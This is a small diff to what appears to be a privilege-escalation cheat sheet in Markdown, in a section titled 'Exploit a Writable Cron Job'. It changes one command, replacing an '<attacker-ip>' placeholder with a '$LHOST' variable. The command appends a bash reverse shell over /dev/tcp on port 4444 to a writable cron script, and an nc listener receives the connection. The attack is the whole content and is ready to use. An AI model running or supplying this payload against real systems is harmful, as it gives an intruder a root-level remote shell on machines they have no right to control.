@@ -44,7 +44,7 @@ grep "CRON" /var/log/syslog
 ### Exploit a Writable Cron Job
 
 ```bash
-echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /path/to/script.sh
+echo "bash -i >& /dev/tcp/$LHOST/4444 0>&1" >> /path/to/script.sh
 nc -lvnp 4444
 ```
 
